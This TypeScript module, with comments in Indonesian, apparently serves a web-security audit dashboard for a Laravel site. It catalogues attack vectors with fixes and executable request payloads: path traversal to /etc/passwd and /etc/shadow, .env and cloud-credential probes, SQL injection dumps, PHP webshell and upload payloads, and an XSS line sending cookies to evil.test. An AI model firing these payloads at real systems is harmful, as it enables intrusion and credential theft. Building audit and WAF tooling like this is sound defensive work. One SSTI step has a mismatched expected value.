/**
 * Informasi kerentanan per vektor audit Tanpa-Pasak: dipakai akordeon
 * "hasil + kerentanan + metode hacker" di tiap kartu serangan.
 */
export interface HackerMethod {
    title: string;
    desc: string;
    /**
     * Aksi eksekusi nyata. `vector` = kirim request GET/POST biasa;
     * `reupload`/`htaccess`/`rce` khusus kartu upload (lab & produksi berkonfirmasi).
     */
    exec?:
        | { kind: "vector"; path: string; method?: string; userAgent?: string; payload?: string }
        | { kind: "reupload" }
        | { kind: "htaccess" }
        | { kind: "rce"; cmd: string };
}

export interface ChainStep {
    label: string;
    desc: string;
    path: string;
    method?: string;
    /** Substring yang dicari di body sebagai tanda langkah berhasil. */
    expect: string;
}

export interface VulnInfo {
    severity: "Kritis" | "Tinggi" | "Sedang" | "Info";
    cwe: string;
    vuln: string;
    gap: string;
    methods: HackerMethod[];
    /** Langkah penanganan: generik + konfigurasi Pasak yang relevan. */
    fix: string;
    /** Rantai eskalasi: langkah berikut setelah metode awal berhasil. */
    chain?: ChainStep[];
}

export const VULN_INFO: Record<string, VulnInfo> = {
    "Baseline GET /": {
        severity: "Info",
        cwe: "—",
        vuln: "Baseline (bukan kerentanan)",
        gap: "Tidak ada — respons normal ini menjadi pembanding untuk membuktikan anomali di tahap berikutnya.",
        fix: "Bukan kerentanan — tidak perlu penanganan. Ganti halaman default Laravel dengan halaman aplikasi agar tidak membocorkan identitas framework.",
        methods: [
            { title: "Fingerprinting", desc: "Hacker membaca header Server/X-Powered-By dan body untuk menebak framework sebelum menyerang.", exec: { kind: "vector", path: "/", method: "GET" } },
        ],
    },
    "Scanner UA sqlmap": {
        severity: "Sedang",
        cwe: "CWE-200",
        vuln: "Exposure of Sensitive Information (recon tak dibatasi)",
        gap: "Server menjawab ramah ke signature scanner terkenal — penyerang bebas memetakan route, versi, dan celah tanpa jejak penolakan.",
        fix: "Pasak: signature scanner_ua + scanner_agents menolak UA sqlmap/nikto/nuclei (403). Tambahan: rate-limit + fail2ban untuk IP yang memindai.",
        methods: [
            { title: "Directory enumeration", desc: "gobuster/ffuf + wordlist untuk menemukan /admin, /.git, /backup.zip.", exec: { kind: "vector", path: "/.git/config", method: "GET" } },
            { title: "Version fingerprinting", desc: "nuclei templates memindai ratusan CVE yang cocok dengan versi terdeteksi.", exec: { kind: "vector", path: "/", method: "GET", userAgent: "Nuclei - Open-source vulnerability scanner" } },
            { title: "Vulnerability scan", desc: "Nikto/Acunetix mengkatalog semua temuan untuk serangan terarah tahap 3.", exec: { kind: "vector", path: "/", method: "GET", userAgent: "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:map_codes)" } },
        ],
    },
    "Probe /.env": {
        severity: "Kritis",
        cwe: "CWE-538",
        vuln: "File Exposure (.env dapat diakses)",
        gap: "Bila file .env terekspos, APP_KEY + kredensial DB/SMTP/AWS bocor sekaligus — satu request meruntuhkan seluruh rahasia aplikasi.",
        fix: "Pasak: signature config_probe + sensitive_paths menolak probe .env (403). Wajib juga di server: deny dotfiles di Nginx/Apache, APP_DEBUG=false, dan rotasi kredensial yang pernah terekspos.",
        methods: [
            { title: "Credential harvesting", desc: "Unduh /.env, ekstrak DB_PASSWORD lalu login langsung ke database.", exec: { kind: "vector", path: "/.env", method: "GET" } },
            { title: "APP_KEY abuse", desc: "Dengan APP_KEY, dekripsi cookie Laravel / buat payload unserialize (CVE pola lama).", exec: { kind: "vector", path: "/?debug=APP_KEY%3Dbase64%3Aabc123", method: "GET" } },
            { title: "Lateral movement", desc: "Kredensial SMTP/AWS dipakai menyerang layanan tetangga (spam, tagihan cloud).", exec: { kind: "vector", path: "/.aws/credentials", method: "GET" } },
        ],
    },
    "Path Traversal /etc/passwd": {
        severity: "Kritis",
        cwe: "CWE-22",
        vuln: "Path Traversal / LFI",
        gap: "Parameter path tidak disanitasi — penyerang keluar dari webroot dan membaca berkas sistem apa pun yang bisa dibaca user web.",
        fix: "Pasak: instant-block path_traversal_public + rules path_traversal/null_byte (403). Di aplikasi: jangan sertakan input user ke path file; pakai allowlist + basename().",
        chain: [
            { label: "Baca shadow (uji privilege)", desc: "Bila terbaca = user webchoice root-level, kritis maksimal.", path: "/?file=../../../../etc/shadow", method: "GET", expect: "root:" },
            { label: "Incar konfigurasi", desc: "database.php berisi kredensial DB aplikasi.", path: "/?file=../../../../config/database.php", method: "GET", expect: "DB_" },
            { label: "Wrapper filter", desc: "php://filter membaca source tanpa eksekusi.", path: "/?file=php://filter/convert.base64-encode/resource=index.php", method: "GET", expect: "PD9waHA" },
        ],
        methods: [
            { title: "File disclosure", desc: "/etc/passwd → enumerasi user OS; lanjut ke config/database.php, .env.", exec: { kind: "vector", path: "/../../../../etc/passwd", method: "GET" } },
            { title: "Log poisoning → RCE", desc: "Suntik PHP via User-Agent ke access.log, lalu include log via LFI = eksekusi kode.", exec: { kind: "vector", path: "/?file=../../../../storage/logs/laravel.log&c=id", method: "GET", userAgent: '<?php system($_GET["c"]); ?>' } },
            { title: "php://filter", desc: "Baca source code (index.php, config) dalam base64 tanpa mengeksekusinya.", exec: { kind: "vector", path: "/?file=php://filter/convert.base64-encode/resource=index.php", method: "GET" } },
        ],
    },
    "XSS Reflected <script>": {
        severity: "Tinggi",
        cwe: "CWE-79",
        vuln: "Reflected Cross-Site Scripting",
        gap: "Input query dicerminkan ke HTML tanpa encoding — browser korban mengeksekusi JavaScript penyerang dalam konteks domain aplikasi.",
        fix: "Pasak: rules xss mencatat & menolak payload <script> (403 bila block_suspicious_requests aktif). Di aplikasi: escape output dengan {{ }}, tambah header Content-Security-Policy.",
        chain: [
            { label: "Bypass event handler", desc: "onerror mengeksekusi tanpa tag script.", path: "/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", method: "GET", expect: "onerror" },
            { label: "Vektor SVG", desc: "onload pada svg lolos filter naif.", path: "/?q=%3Csvg%20onload%3Dalert(1)%3E", method: "GET", expect: "onload" },
            { label: "Curi cookie (PoC)", desc: "Payload pencurian sesi — bukti dampak maksimal.", path: "/?q=%3Cscript%3Edocument.cookie%3C%2Fscript%3E", method: "GET", expect: "document.cookie" },
        ],
        methods: [
            { title: "Session hijacking", desc: "fetch(document.cookie) dikirim ke server penyerang → bajak sesi login.", exec: { kind: "vector", path: "/?q=%3Cscript%3Efetch(%27https%3A%2F%2Fevil.test%2F%3Fc%3D%27%2Bdocument.cookie)%3C%2Fscript%3E", method: "GET" } },
            { title: "Deface & phishing", desc: "Timpa DOM dengan form login palsu yang memanen kredensial.", exec: { kind: "vector", path: "/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", method: "GET" } },
            { title: "Keylogging", desc: "Listener keydown merekam semua ketikan korban di halaman terserang.", exec: { kind: "vector", path: "/?q=%3Csvg%20onload%3Dalert(1)%3E", method: "GET" } },
        ],
    },
    "SQLi Auth Bypass OR 1=1": {
        severity: "Kritis",
        cwe: "CWE-89",
        vuln: "SQL Injection",
        gap: "Input digabung mentah ke query SQL — penyerang mengubah logika WHERE, membaca tabel apa pun, bahkan menulis file via INTO OUTFILE.",
        fix: "Pasak: rules sql_injection (critical) + auto-block setelah ambang. Di aplikasi: selalu prepared statement / Eloquent binding — jangan gabung string ke SQL.",
        chain: [
            { label: "Petakan kolom", desc: "ORDER BY menebak jumlah kolom untuk UNION presisi.", path: "/?id=1%20ORDER%20BY%205", method: "GET", expect: "Laravel" },
            { label: "Dump skema", desc: "Baca information_schema untuk daftar tabel.", path: "/?id=-1%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables", method: "GET", expect: "users" },
            { label: "Konfirmasi blind", desc: "SLEEP(5) membuktikan injeksi buta bila output disaring.", path: "/?id=1%20AND%20SLEEP(5)", method: "GET", expect: "Laravel" },
        ],
        methods: [
            { title: "Auth bypass", desc: "admin' OR '1'='1 masuk tanpa password.", exec: { kind: "vector", path: "/?user=admin%27%20OR%20%271%27%3D%271", method: "GET" } },
            { title: "UNION data exfiltration", desc: "UNION SELECT password FROM users → dump kredensial.", exec: { kind: "vector", path: "/?id=1%20UNION%20SELECT%20password%20FROM%20users", method: "GET" } },
            { title: "Time-based blind", desc: "AND SLEEP(5) menebak data per bit bila output tidak terlihat.", exec: { kind: "vector", path: "/?id=1%20AND%20SLEEP(5)", method: "GET" } },
        ],
    },
    "SSTI Canary {{7*7}}": {
        severity: "Kritis",
        cwe: "CWE-94",
        vuln: "Server-Side Template Injection",
        gap: "Input dievaluasi template engine server — canary {{7*7}}→49 membuktikan eksekusi; objek internal (config, env) bisa diakses lalu RCE.",
        fix: "Pasak: signature ssti instant-block canary {{7*7}} (403). Di aplikasi: jangan render input user sebagai template; bila perlu, pakai sandbox + denylist sintaks.",
        chain: [
            { label: "Konfirmasi aritmetika", desc: "{{7-7}} harus menghasilkan 0 bila template mengevaluasi.", path: "/?q=%7B%7B7-7%7D%7D", method: "GET", expect: "49" },
            { label: "Introspeksi objek", desc: "{{self}} membocorkan objek template internal.", path: "/?q=%7B%7Bself%7D%7D", method: "GET", expect: "self" },
            { label: "Varian sintaks", desc: "${7*7} menguji engine gaya Spring/Freemarker.", path: "/?q=%24%7B7*7%7D", method: "GET", expect: "49" },
        ],
        methods: [
            { title: "Canary confirm", desc: "{{7*7}} → 49 di body = template mengevaluasi input.", exec: { kind: "vector", path: "/?q=%7B%7B7*7%7D%7D", method: "GET" } },
            { title: "Object traversal", desc: "{{self.__class__...}} / {{config.items}} untuk membaca konfigurasi dan secret.", exec: { kind: "vector", path: "/?q=%7B%7Bself%7D%7D", method: "GET" } },
            { title: "RCE", desc: "Subclass juggling ke os.popen/system untuk eksekusi perintah OS.", exec: { kind: "vector", path: "/?q=%24%7B7*7%7D", method: "GET" } },
        ],
    },
    "PHP Injection <?php": {
        severity: "Kritis",
        cwe: "CWE-94",
        vuln: "Code Injection (PHP)",
        gap: "Tag PHP lolos via parameter — bila aplikasi me-include/eval input, penyerang mengeksekusi kode server-side seketika.",
        fix: "Pasak: signature php_injection instant-block tag <?php (403). Di aplikasi: jangan eval/include input user dalam kondisi apa pun.",
        methods: [
            { title: "Direct eval", desc: "?name=<?php system($_GET[c]) ?> + include = shell.", exec: { kind: "vector", path: "/?name=%3C%3Fphp%20system(%24_GET%5B%27c%27%5D)%3B%20%3F%3E", method: "GET" } },
            { title: "Base64 smuggling", desc: "eval(base64_decode(...)) menghindari filter string.", exec: { kind: "vector", path: "/", method: "POST", payload: "q=eval(base64_decode(\"cGhwaW5mbygpOw==\"))" } },
            { title: "Persistence", desc: "Tulis webshell permanen via file_put_contents sekali eksekusi berhasil.", exec: { kind: "vector", path: "/?page=include%20%22..%2F..%2Fconfig%2Fdatabase.php%22", method: "GET" } },
        ],
    },
    "Upload shell.php.jpg": {
        severity: "Kritis",
        cwe: "CWE-434",
        vuln: "Unrestricted File Upload (double extension)",
        gap: "Validasi hanya melihat ekstensi terakhir/MIME — shell.php.jpg lolos lalu dieksekusi via .htaccess AddType atau LFI/include.",
        fix: "Pasak: unsafe_filename + webshell_upload menolak .php/.phtml/double-extension/null-byte (403). Di aplikasi: validasi MIME + ekstensi di server, simpan di luar webroot, rename acak. Lihat SafeImageFile.",
        methods: [
            { title: "Double extension", desc: "shell.php.jpg lolos filter naif yang hanya cek akhiran .jpg.", exec: { kind: "reupload" } },
            { title: "HTAccess override", desc: "Unggah .htaccess (AddType application/x-httpd-php .jpg) agar .jpg dieksekusi.", exec: { kind: "htaccess" } },
            { title: "Webshell ops", desc: "?cmd=id → enum, unduh DB, tanam ransomware, pivot ke server lain.", exec: { kind: "rce", cmd: "id" } },
        ],
    },
};

export function severityVariant(sev: VulnInfo["severity"]): "destructive" | "secondary" | "outline" {
    if (sev === "Kritis") {
        return "destructive";
    }
    if (sev === "Tinggi") {
        return "secondary";
    }
    return "outline";
}
